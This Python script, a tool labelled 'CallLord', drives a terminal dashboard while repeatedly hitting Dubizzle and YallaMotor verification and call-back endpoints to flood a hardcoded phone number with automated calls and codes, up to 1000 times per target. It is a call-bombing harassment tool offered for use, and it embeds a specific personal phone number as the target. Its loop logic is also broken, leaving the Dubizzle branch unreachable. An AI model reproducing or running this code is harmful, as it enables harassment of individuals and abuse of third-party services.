from dubizzle_worker import sendRequest as dubizzle_handler
from yallamotor_worker import sendRequest as yallamotor_handler
from Initializer import workerObject, targetObject
from rich import print
from rich.pretty import pprint
from rich.pretty import Pretty
from rich.spinner import Spinner
from rich.console import Console
from rich.layout import Layout
from rich.text import Text
from rich.live import Live
from rich.console import Group
from rich.table import Table
from rich.console import Console
from rich.panel import Panel
import time

target_list = "01277775763"
targets = []
error_log = []

class stats:
    def __init__(self,info, req, suc, fail):
        self.info = ""
        self.req = 0
        self.suc = 0
        self.fail = 0

dubizzle_stats = stats("Dubizzle", 0,0,0)
yallamotor_stats = stats("YallaMotor",0,0,0)
stats_list = [dubizzle_stats, yallamotor_stats]

def generate_target_stats_ui(stats_list) -> Table:
    global error_log
    image = """
   ______      ______                   __
  / ____/___ _/ / / /   ____  _________/ /
 / /   / __ `/ / / /   / __ \/ ___/ __  / 
/ /___/ /_/ / / / /___/ /_/ / /  / /_/ /  
\____/\__,_/_/_/_____/\____/_/   \__,_/   
                                  by g.
    """
    image = Text(image, justify="center", style="bold red")
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=8),
        Layout(name="main", ratio=2),
    )

    layout["header"].update(image)
    layout["main"].split_column(
        Layout(name="mid",size=5),
        Layout(name="bottom",size=5),
        
    )
    
    worker_table = Table("Worker","Mode","Hit" ,"Miss", "Total", expand=True, box=None)
    error_table = Table("Log", expand=True, box=None)
 
    for stat in stats_list:
        #parameter_display =  Pretty(worker.workerParameters)
        worker_table.add_row(str(stat.info), "Call", str(stat.suc), str(stat.fail), str(stat.req))
    
    for item in error_log:
        error_table.add_row(
            item
        ) 
    layout["mid"].update(worker_table)
    layout["bottom"].update(error_table)
    
    return layout





def dubizzle_sendRequest(target, dubizzle_stats):
    req = dubizzle_handler(target)
    try :
        if "Token" in req.text :
            dubizzle_stats.suc += 1
        else :
            dubizzle_stats.fail += 1
            error_log.append(f"Dubizzle: {req.text}\t Target: {target}")
            time.sleep(600)
    except Exception as e :
        dubizzle_stats.fail += 1
        error_log.append(f"Dubizzle Exception: {e}\t Target: {target}")
        time.sleep(100)
    dubizzle_stats.req += 1
    return dubizzle_stats

def yallamotor_sendRequest(target, yallamotor_stats):
    req = yallamotor_handler(target)
    try :
        if "You will receive an automatic call" in req.text :
            yallamotor_stats.suc += 1
        else :
            yallamotor_stats.fail += 1
            error_log.append(f"YallaMotor: {req.text}\t Target: {target}")
            time.sleep(600)
    except Exception as e :
        yallamotor_stats.fail += 1
        error_log.append(f"YallaMotor Exception: {e}\t Target: {target}")
        time.sleep(600)
    yallamotor_stats.req += 1
    return yallamotor_stats

def attack_cycle(target,live, stats_list) :
    global dubizzle_stats
    global yallamotor_stats
    count = 0
    while count < 1000 :
        burst = 0
        while burst < 5 :
            yallamotor_stats = yallamotor_sendRequest(target, yallamotor_stats)
            count += 1
            burst += 1
            live.update(generate_target_stats_ui(stats_list))
            time.sleep(60)
        while burst <5:
            dubizzle_stats = dubizzle_sendRequest(target, dubizzle_stats)
            count += 1
            burst += 1
            live.update(generate_target_stats_ui(stats_list))
            time.sleep(30)

def main():
    targets = target_list.split(",")
    # Initializing worker stats
    with Live(generate_target_stats_ui(stats_list), refresh_per_second=4) as live:
        for target in targets:
            attack_cycle(target, live, stats_list)

if __name__ == "__main__":
    main()